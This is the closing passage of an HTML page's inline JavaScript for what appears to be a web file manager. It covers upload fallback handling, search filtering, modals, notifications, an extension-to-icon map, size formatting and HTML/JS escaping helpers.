                    document.getElementById('uploadProgressFill').classList.remove('fallback');
                    
                    if (fallbackResult.success) {
                        this.notify(`Uploaded: ${fallbackResult.file.name} (fallback)${fallbackResult.overwritten ? ' (overwritten)' : ''}`, 'warning');
                        this.refresh();
                    } else {
                        this.notify(`Upload failed: ${fallbackResult.message}`, 'error');
                    }
                } catch (err) {
                    this.showLoading(false);
                    this.notify(`Upload completely failed: ${err.message}`, 'error');
                }
                this.pendingFile = null;
            },
            
            updateLoadingText(text) { document.getElementById('loadingText').textContent = text; },
            
            search(query) {
                if (!query) { this.render(); return; }
                const original = this.items;
                this.items = original.filter(item => item.name.toLowerCase().includes(query.toLowerCase()));
                this.render();
                this.items = original;
            },
            
            showModal(id) { document.getElementById(id).classList.add('active'); },
            closeModal(id) { document.getElementById(id).classList.remove('active'); },
            
            showLoading(show) {
                document.getElementById('loading').classList.toggle('active', show);
                if (!show) this.updateLoadingText('Loading...');
            },
            
            notify(msg, type = 'info') {
                const div = document.createElement('div');
                div.className = 'notification ' + type;
                div.innerHTML = '<strong>' + this.escapeHtml(msg) + '</strong>';
                document.getElementById('notifications').appendChild(div);
                setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 300); }, 4000);
            },
            
            getFileIcon(name) {
                const ext = name.split('.').pop().toLowerCase();
                const icons = { php:'📄', html:'🌐', css:'🎨', js:'⚡', json:'📋', txt:'📄', md:'📝', sql:'🗄️', jpg:'🖼️', jpeg:'🖼️', png:'🖼️', gif:'🖼️', zip:'📦', rar:'📦', pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', mp3:'🎵', mp4:'🎬', exe:'⚙️', dll:'⚙️', bat:'📜', sh:'📜', ps1:'📜', py:'🐍', rb:'💎', java:'☕', c:'🔧', cpp:'🔧', h:'🔧', cs:'🔷', go:'🐹', rs:'🦀', swift:'🦉', kt:'🎯', ts:'📘', jsx:'⚛️', tsx:'⚛️', vue:'🟢', scss:'🎨', sass:'🎨', less:'🎨', yaml:'📋', yml:'📋', xml:'📋', ini:'⚙️', conf:'⚙️', htaccess:'🔒', log:'📋', env:'🔐', gitignore:'🔒' };
                return icons[ext] || '📄';
            },
            
            formatSize(bytes) {
                if (bytes === 0) return '0 B';
                const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            },
            
            escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            },
            
            escapeJs(str) {
                return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
            }
        };
        
        document.addEventListener('DOMContentLoaded', () => app.init());
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
        });
    </script>
</body>
</html>
